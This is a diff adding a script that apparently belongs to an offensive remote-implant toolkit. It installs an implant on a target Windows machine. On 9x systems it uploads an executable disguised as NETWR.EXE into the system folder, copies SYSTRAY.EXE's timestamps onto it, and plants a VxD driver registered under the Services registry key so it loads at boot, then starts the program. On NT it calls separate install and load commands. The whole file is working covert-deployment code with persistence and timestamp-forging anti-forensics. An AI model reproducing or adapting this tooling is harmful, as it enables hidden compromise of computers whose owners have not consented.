@@ -1,0 +1,176 @@
+#-------------------------------------------------------------------------------
+# File: InstallExe.eps
+#
+# Description: Performs a level4 install for the exe version
+#
+# Modifications:
+#	08/15/05	Created
+#-------------------------------------------------------------------------------
+@include "_FileExists.epm";
+@include "_GetDirectory.epm";
+@include "_GetSystemPaths.epm";
+@include "_VersionChecks.epm";
+
+@echo off;
+
+if (($argc < 3) || ($argc > 6)) {
+    echo "Usage: $argv[0] <localFile> <remoteName> [notused1] [notused2] [notused3]";
+    return false;
+}
+
+string $localFile = $argv[1];
+
+if (_IsTargetNtFamily()) {
+
+    # NT Family
+    return InstallOnNt($localFile);
+    
+} else {
+
+    # 9x Family
+    return InstallOn9x($localFile);
+
+}
+
+#-------------------------------------------------------------------------------
+sub InstallOn9x(IN string $localFile)
+{
+
+    string $remoteName = "NETWR.EXE";
+    string $requiredPath = "C:\\WINDOWS\\system";    
+    string $matchFile = "SYSTRAY.EXE";
+
+    string $system;
+    string $root;
+    ifnot (_GetSystemPaths($root, $system)) {
+	echo "* Unable to get system directory";
+	return false;
+    }
+
+    string $fullPath = "$root\\$system";
+    if ($fullPath != $requiredPath) {
+	echo "* System path is not $requiredPath (it is $fullPath).  Cannot install";
+	return false;
+    }
+
+    if (_FileExists($remoteName, $fullPath)) {
+	echo "$remoteName is already installed (file exists)";
+	return false;
+    }
+    
+    # upload exe
+    echo "Uploading exe";
+    if (`put "$localFile" -name "$fullPath\\$remoteName" -permanent`) {
+	echo "    UPLOADED";
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+
+    # match file times for new exe
+    echo "Matching file time for EXE";
+    if (`matchtimes "$fullPath\\$matchFile" "$fullPath\\$remoteName"`) {
+	echo "    SUCCESS";
+    } else {
+	echo "    FAILED (but continuing anyway)";
+    }
+
+    if (install9xDriver($fullPath) == false) {
+	echo "";
+	echo "*** Install failed -- perform cleanup by hand ***";
+	echo "";
+	return false;
+    }
+
+    echo "Starting executable";
+    ifnot (`run -command "$fullPath\\$remoteName"`) {
+	echo "    FAILED";
+	echo "";
+	echo "*** Install failed -- perform cleanup by hand ***";
+	echo "";
+	return false;
+    } else {
+	echo "    SUCCESS";
+    }
+
+    return true;
+
+}
+# END InstallOn9x
+
+#-------------------------------------------------------------------------------
+sub InstallOnNt(IN string $localFile)
+{
+
+    ifnot (`dp_install "$localFile"`) {
+	return false;
+    }
+
+    return `dp_load`;
+
+}
+# END InstallOnNt
+
+#-------------------------------------------------------------------------------
+sub Install9xDriver(IN string $fullPath)
+{
+
+    string $drvName = "VNETWR";
+    string $matchFile = "SYSTRAY.EXE";
+
+    # make sure it's not already installed
+    if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\\\VxD\\$drvName`) {
+	echo "$drvName is already installed (key exists)";
+	return false;
+    }
+
+    if (_FileExists("$drvName.VXD", $fullPath)) {
+	echo "$drvName is already installed (file exists)";
+	return false;
+    }
+
+    # get the local vxd location
+    string $localFile;
+    if (_GetLpResourcesDirectory($localFile) == false) {
+	echo "* Failed to get local resources directory";
+	return false;
+    }
+
+    $localFile = "$localFile\\PC\\Level4\\$drvName.VXD";
+    string $remoteName = "$drvName.VXD";
+
+    # upload driver
+    echo "Uploading driver";
+    if (`put "$localFile" -name "$fullPath\\$remoteName" -permanent`) {
+	echo "    UPLOADED";
+    } else {
+	echo "    FAILED";
+	return false;
+    }
+
+    # match file times for new exe
+    echo "Matching file time for driver";
+    if (`matchtimes "$fullPath\\$matchFile" "$fullPath\\$remoteName"`) {
+	echo "    SUCCESS";
+    } else {
+	echo "    FAILED (but continuing anyway)";
+    }
+
+    # add the registry keys
+    bool $keysAdded = true;
+    echo "Adding registry keys";
+    ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\VxD\\$drvName -value StaticVxD -type REG_SZ -data "$fullPath\\$remoteName"`) {
+	$keysAdded = false;
+    }
+	
+    if ($keysAdded == false) {
+	echo "    FAILED";
+	return false;
+    } else {
+	echo "    SUCCESS";
+    }
+
+    return true;
+
+}
+# END Install9xDriver
